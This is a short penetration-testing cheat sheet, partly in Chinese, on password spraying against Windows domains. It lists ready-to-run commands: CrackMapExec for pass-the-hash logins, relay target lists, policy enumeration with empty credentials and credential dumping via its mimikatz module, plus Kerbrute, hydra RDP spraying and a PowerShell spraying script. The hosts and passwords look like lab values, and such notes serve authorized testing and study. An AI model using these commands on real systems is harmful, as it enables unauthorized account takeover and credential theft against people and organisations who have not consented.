* 播撒前查看下域密码策略`net accounts`, `--pass-pol`
* try ALL PR
# Spraying

## CrackMapExec
[CrackMapExec CheatSheet](https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/)
[Fully Understand CrackMapExec(cme)](https://ptestmethod.readthedocs.io/en/latest/cme.html)
```bash
# Support protocol: RDP, winrm, smb, mssql, ftp, ssh,ldap
#--pass-pol: 获取域密码政策; 
crackmapexec smb -L 
crackmapexec 172.21.0.0 -u Administrator -H [hash] --local-auth #Some Creds use for localauth (without domain name front...Don't Forget it!)
crackmapexec 172.21.0.0 -u Administrator -H [hash] --share

crackmapexec smb --gen-relay-list smb-targets.txt 172.21.0.0/24 #
crackmapexec smb 172.21.0.0/24 -u user -p 'Password' --local-auth -M mimikatz
crackmapexec smb x.x.x.x --pass-pol -u '' -p ''
```
## Kerbrute
通过AS-REQ能否获取TGT，进行播撒。
```powershell
type .\usernames.txt
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
## hydra
```bash
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```
## Script [Spray-Passwords.ps1](https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1)
```powershell
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```